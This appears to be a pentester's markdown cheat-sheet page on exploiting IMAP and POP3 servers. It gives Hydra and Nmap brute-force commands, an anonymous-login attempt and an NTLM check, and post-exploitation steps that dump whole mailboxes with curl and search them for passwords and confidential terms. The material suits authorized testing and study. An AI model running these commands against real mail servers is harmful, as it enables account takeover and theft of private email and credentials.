---
id: Exploitation
aliases: []
tags: []
---

<!-- Exploitation {{{-->
# Exploitation

<!-- IMAP {{{-->
## IMAP

<!-- Anonymous Login {{{-->
### Anonymous Login

```sh
a1 LOGIN "" ""
```

___

<!-- }}} -->

<!-- Brute Force {{{-->
### Brute Force

Brute force imap server credentials

Brute force with [[Nmap]]

> [!example]-
>
>
> ```sh
> nmap --script imap-brute -p 143,993 <target_ip> -oA imap-brute
> ```
>
> ```sh
> nmap -sV --script imap-brute -p <port> <target_ip> -oA imap-brute-version
> ```

Brute force with [[Hydra]]

> [!example]-
>
> IMAPS (*SSL/TLS*)
>
> ```sh
> hydra -S -v -l <username> -P <passwords.txt> -s 993 -f <target> imap -V
> ```
>
> IMAP (*plaintext*)
>
> ```sh
> hydra -l <username> -P <passwords.txt> -f <target> imap -V
> ```
>
> Multiple users
>
> ```sh
> hydra -L <users.txt> -P <passwords.txt> imap://<target>
> ```

___

<!-- }}} -->

<!-- Pass-the-Hash {{{-->
### Pass-the-Hash

Exploit NTLM authentication to use password hashes instead of plaintext
passwords

> [!example]-
>
> Check if NTLM auth is supported
>
> ```sh
> nmap -p 143 --script imap-ntlm-info <target> -oA imap-script-ntlm-info
> ```

___

<!-- }}} -->

<!-- IMAP Injection {{{-->
### IMAP Injection

[IMAP injection attacks](https://hackviser.com/tactics/pentesting/services/imap#imap-injection)
involve injecting malicious commands or data into IMAP requests
to exploit vulnerabilities in the server software
or gain unauthorized access to email accounts.

___

<!-- }}} -->

<!-- Man-in-the-Middle {{{-->
### Man-in-the-Middle

[MitM attacks](https://hackviser.com/tactics/pentesting/services/imap#man-in-the-middle-mitm-attacks)
on IMAP traffic can intercept and modify email messages exchanged
between the client and server, compromising the confidentiality
and integrity of email communication.

___

<!-- }}} -->

<!-- }}} -->

<!-- POP3 {{{-->
## POP3

<!-- Brute Force {{{-->
### Brute Force

Brute force POP3 login credentials

> [!example]-
>
> Brute force with [[Nmap]]
>
> ```sh
> nmap -p 110 --script pop3-brute --script-args userdb=users.txt,passdb=pass.txt <target> -oA pop3-brute
> ```
>
> Brute force with [[Hydra]]
>
> ```sh
> hydra -L <users.txt> -P <passwords.txt> -f <target> pop3 -V
> ```
>
> ```sh
> hydra -l <username> -P <passwords.txt> -f <target> pop3 -V
> ```

___

<!-- }}} -->

<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

## IMAP

<!-- Email Extraction {{{-->
### Email Extraction

Extract emails and sensitive information from compromised IMAP accounts

Read and Search Emails

> [!example]-
>
> Read all emails
>
> ```sh
> a1 LOGIN <username> <password>
> ```
>
> ```sh
> a2 SELECT INBOX
> ```
>
> ```sh
> a3 FETCH 1:* (BODY[])
> ```
>
> Search for specific content
>
> ```sh
> a4 SEARCH SUBJECT "password"
> ```
> ```sh
> a5 SEARCH FROM "admin@target.com"
> ```
> ```sh
> a6 SEARCH TEXT "confidential"
> ```

Download Emails

> [!example]-
>
> Download all emails with curl
>
> ```sh
> for i in {1..100}; do
>   curl -u username:password "imap://target.com/INBOX;UID=$i" > email_$i.eml
> done
> ```

___

<!-- }}} -->

<!-- Sensitive Information {{{-->
### Sensitive Information

Search for sensitive information and credentials in email content.
Keyword Search

> [!example]-
>
> Search for keywords
>
> ```sh
> SEARCH TEXT "password"
> ```
>
> ```sh
> SEARCH TEXT "credential"
> ```
>
> ```sh
> SEARCH TEXT "confidential"
> ```
>
> ```sh
> SEARCH SUBJECT "reset"
> ```
>
> Search by date
>
> ```sh
> SEARCH SINCE 01-Jan-2024
> ```
>
> Combined search
>
> ```sh
> SEARCH FROM "admin" SUBJECT "password"
> ```

___

<!-- }}} -->

<!-- }}} -->
